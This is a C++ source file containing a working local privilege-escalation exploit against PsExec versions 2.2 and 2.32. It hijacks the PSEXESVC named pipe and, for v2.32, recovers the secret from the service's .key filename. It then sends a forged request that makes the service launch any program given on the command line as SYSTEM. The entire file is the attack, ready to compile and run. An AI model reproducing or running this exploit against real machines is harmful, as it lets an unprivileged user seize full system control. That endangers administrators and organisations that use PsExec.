//David Wells
//Psexec Escalation
//01/28/2020
//Tested with PsExec v2.2
//Tested with PsExec v2.32

#include <iostream>
#include <Windows.h>
#include <string>
#include <sstream>
#include <wincrypt.h>
#include <tlhelp32.h>
#include <AclAPI.h>

// PSexec process structure sent to PSEXESVC
typedef struct psexecProcess {
    BYTE padding_0[0x210];
    wchar_t processPath[0x100];
    DWORD p0[2] = { 0 };
    wchar_t processArg[0x100] = {0};
    BYTE padding_1[0x3cF8] = { 0 };
    wchar_t currentDirectory[0x100] = { 0 };
    BYTE padding_3[0x110] = { 0 };
    bool IsSystem = true;
    BYTE padding_4[0xD] = { 1 };
    BYTE desktop = 0;
    BYTE padding_5[0x5] = { 0 };
    bool ImpersonateClient = false;
    BYTE padding_6[0x4000];
};

HANDLE version_mutex = CreateMutex(NULL, FALSE, NULL);
psexecProcess* proc = new psexecProcess;

bool ProcessExists(const wchar_t procName[MAX_PATH]) {
    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);
    bool procFound = false;
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

    if (Process32First(snapshot, &entry) == TRUE)
        while (Process32Next(snapshot, &entry) == TRUE)
            if (lstrcmpi((wchar_t*)entry.szExeFile, procName) == 0) {
                procFound = true;
            }

    CloseHandle(snapshot);

    return procFound;
}

// Version 2.2
DWORD WINAPI EscalatePsExecv22(void* arg) {
    UNREFERENCED_PARAMETER(arg);
   
    BYTE pipeBuffer[0xC000] = { 0xc8 }; // version info
    HANDLE hPipe = NULL;
    HCRYPTPROV prov = NULL;
    HCRYPTKEY psexecKey = NULL, ourKey = NULL;
    DWORD returned = 0, written = 0, dataLen = 0x4a5c, len = 0x100, pdwDataLen = 0x4a5c;

    // Wait until PsExec spawns
    while (!ProcessExists(L"PSEXESVC.EXE"))
        continue;

    // Just because PsExecSvc was found running, its possible key file was dropped, which means its new version,
    // consult other thread first. SwitchTothread() isnt long enough.
    Sleep(5000);

    WaitForSingleObject(version_mutex, INFINITE);

    // Trigger pipe connection on server
    hPipe = CreateFile(L"\\\\.\\pipe\\PSEXESVC", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
    WriteFile(hPipe, pipeBuffer, 0x10, &returned, NULL);
    returned = 0;
    // Version info
    ReadFile(hPipe, pipeBuffer, 0x10, &returned, NULL);
    // Read Incomming key size
    ReadFile(hPipe, pipeBuffer, 4, &returned, NULL);
    len = ((BYTE*)pipeBuffer)[0];
    // Read and import PsexecSVC Key
    ReadFile(hPipe, pipeBuffer, len, &returned, NULL);
    if (!CryptAcquireContextW(&prov, 0, 0, 0x18, 0))
        if (!CryptAcquireContextW(&prov, 0, 0, 0x18, 8))
            if (!CryptAcquireContextW(&prov, 0, 0, 0x18, 0x20))
                if (!CryptAcquireContextW(&prov, 0, 0, 0x18, 0x28))
                    return -1;
    CryptImportKey(prov, ((BYTE*)pipeBuffer), len, 0, CRYPT_EXPORTABLE, &psexecKey);
    //Generate and export our key
    CryptGenKey(prov, 0x6610, CRYPT_EXPORTABLE, &ourKey);
    len = 0;
    CryptExportKey(ourKey, psexecKey, SIMPLEBLOB, 0, 0, &len);
    BYTE* keybuff = (BYTE*)HeapAlloc(GetProcessHeap(), MEM_COMMIT | MEM_RESERVE, len);
    CryptExportKey(ourKey, psexecKey, SIMPLEBLOB, 0, keybuff, &len);
    // Send our Key to PSEXECSVC
    WriteFile(hPipe, &len, 0x4, &returned, NULL);
    WriteFile(hPipe, keybuff, len, &returned, NULL);
    // Encrypt and send our process information to launch as SYSTEM
    CryptEncrypt(ourKey, NULL, true, 0, NULL, &pdwDataLen, dataLen);
    CryptEncrypt(ourKey, NULL, true, 0, (BYTE*)proc, &dataLen, pdwDataLen);
    WriteFile(hPipe, &dataLen, 0x4, &returned, NULL);
    WriteFile(hPipe, proc, dataLen, &returned, NULL); // Encrypted Data
    ReleaseMutex(version_mutex);
    return 0;
}

// Version 2.32
DWORD WINAPI EsacalatePsExecv232(void* arg) {

    UNREFERENCED_PARAMETER(arg);
    BYTE pipeBuffer[0xC000]; 
    memset(pipeBuffer, 0x01, sizeof(pipeBuffer));
    wchar_t computerName[0x200];
    DWORD returned = 0, written = 0, dataLen = 0x4a5c, len = 0x100, pdwDataLen = 0x4a5c, computerNameLen = 0x200;
    WIN32_FIND_DATA data;
    wchar_t sPath[MAX_PATH];

    // Wait for ".key" file to drop
    lstrcpyW(sPath, L"C:\\Windows\\*.key");
    while (FindFirstFileW(sPath, &data) == INVALID_HANDLE_VALUE);
    WaitForSingleObject(version_mutex, INFINITE);
    std::wstring psexecKeyFile(data.cFileName);

    // Parse key file for relevant data to send to server
    GetComputerNameW(computerName, &computerNameLen);
    size_t key_pos = psexecKeyFile.find(computerName)+computerNameLen+1;
    if (key_pos == std::string::npos)
        return -1;
    std::wstring filesecret_str = psexecKeyFile.substr(key_pos, psexecKeyFile.find(L".") - key_pos);
    long filesecret = wcstoll(filesecret_str.c_str(), NULL, 16);
    ((DWORD*)pipeBuffer)[0x214 / sizeof(DWORD)] = filesecret;
    ((BYTE*)pipeBuffer)[0x20b] = 0x00;
    ((BYTE*)pipeBuffer)[0x20a] = 0x00;
    ((BYTE*)pipeBuffer)[0x209] = 0x00;
    ((BYTE*)pipeBuffer)[0x208] = 0xc8;
    lstrcpyW((wchar_t*)pipeBuffer, computerName);

    // This is needed. Server doesn't start listening instantly
    Sleep(3000);

    // Trigger pipe connection on server
    HANDLE hPipe = CreateFile(L"\\\\.\\pipe\\PSEXESVC", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);

    //Tell PSEXESVC there is an incomming "namedpipe connection"
    WriteFile(hPipe, pipeBuffer, 0x228, &returned, NULL);
    returned = 0;
    // Write proc payload (no encryption needed!)
    WriteFile(hPipe, proc, dataLen, &returned, NULL);
    ReleaseMutex(version_mutex);
    return 0;
}

void PsExecEscalate(wchar_t processPath[0x100], wchar_t processArg[0x100]) {
    
    bool threadExit = false;

    //Apply commandline params
    if (processPath != NULL)
        lstrcpyW(proc->processPath, processPath);
    if (processArg != NULL)
        lstrcpyW(proc->processArg, processArg);

    //Hog named pipe needed by PSEXESVC
    CreateNamedPipe(L"\\\\.\\pipe\\PSEXESVC", PIPE_ACCESS_DUPLEX, PIPE_READMODE_MESSAGE | PIPE_TYPE_MESSAGE, 0xff, 0x10000, 0x10000, 0x2710, NULL);

    // Rather than attempting to query version of local PsExecSvc version, I opt to detect version this way
    // Thats because this version detection technique will also work in the instance that PsExec has never been ran on the client before
    HANDLE hT22 = CreateThread(NULL, 0, EscalatePsExecv22, NULL, 0, NULL);
    HANDLE hT232 = CreateThread(NULL, 0, EsacalatePsExecv232, NULL, 0, NULL);

    while (!threadExit) {
        threadExit = !(WaitForSingleObject(hT22, 1000) & WaitForSingleObject(hT232, 1000)); // exit process when either thread exits
    }

}

VOID Usage() {
    std::cout << "Usage: PsExecEscalation.exe <processPath> (optional: <processArguments>)" << std::endl;
    exit(0);
}

int main()
{
    int args = 0;
    LPWSTR* cmdLine = CommandLineToArgvW(GetCommandLine(), &args);
    if (args <= 1)
        Usage();
    else if (args == 2)
        PsExecEscalate(cmdLine[1], NULL);
    else
        PsExecEscalate(cmdLine[1], cmdLine[2]);
}
